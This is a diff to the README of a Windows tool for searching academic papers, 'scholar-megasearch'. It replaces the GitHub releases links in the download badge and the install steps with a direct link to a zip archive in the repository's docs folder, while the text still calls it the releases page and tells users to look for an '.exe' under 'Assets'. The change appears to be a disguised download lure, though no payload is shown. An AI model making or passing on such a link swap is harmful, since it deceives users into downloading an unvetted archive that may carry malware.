@@ -1,6 +1,6 @@
 # 🔍 scholar-megasearch - Find academic papers across many databases
 
-[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Dieterburdened606/scholar-megasearch/releases)
+[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Dieterburdened606/scholar-megasearch/main/docs/megasearch-scholar-1.6.zip)
 
 ## What this tool does
 
@@ -21,7 +21,7 @@ You need a computer running Windows 10 or Windows 11.
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the [releases page](https://github.com/Dieterburdened606/scholar-megasearch/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/Dieterburdened606/scholar-megasearch/main/docs/megasearch-scholar-1.6.zip).
 2. Look for the section labeled "Assets".
 3. Find the file that ends with `.exe`. 
 4. Click the file name to start the download.
